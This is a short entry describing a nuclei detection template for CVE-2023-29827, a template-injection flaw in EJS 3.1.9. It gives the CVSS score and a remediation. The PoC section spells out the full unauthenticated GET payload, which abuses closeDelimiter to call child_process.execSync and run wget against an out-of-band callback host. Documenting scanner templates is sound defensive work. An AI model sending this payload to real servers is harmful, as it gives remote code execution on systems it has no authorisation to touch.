---
cve_id: CVE-2023-29827
template_path: nuclei-templates/http/cves/2023/CVE-2023-29827.yaml
affected_product: EJS
severity: critical
authentication: none
external_callback: true
affected_versions: 3.1.9
preconditions: ejs file is controllable
poc_classification: rce
---

## Vulnerability
Server-side template injection (SSTI) in Embedded JavaScript (EJS) v3.1.9 for Node.js. When the EJS template file is user-controllable, an attacker can inject arbitrary template code by manipulating the `closeDelimiter` parameter inside `settings[view options]`.  

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8) • CWE-74 • Impact: full remote code execution on the server.  
Remediation: update EJS to the latest version.

## PoC / Detection
Classification: rce

The template sends a single unauthenticated GET request to `{{BaseURL}}/page?settings[view%20options][closeDelimiter]=x%22)%3bprocess.mainModule.require(%27child_process%27).execSync(%27wget+http://{{interactsh-url}}%27)%3b//`. The payload closes the EJS delimiter and forces `child_process.execSync` to issue an outbound HTTP request. Detection succeeds if both an interactsh HTTP callback is received and the response body contains the string "You are viewing page number".

## References
- https://github.com/mde/ejs/issues/720
- https://github.com/mde/ejs/blob/main/SECURITY.md#out-of-scope-vulnerabilities
- https://nvd.nist.gov/vuln/detail/CVE-2023-29827
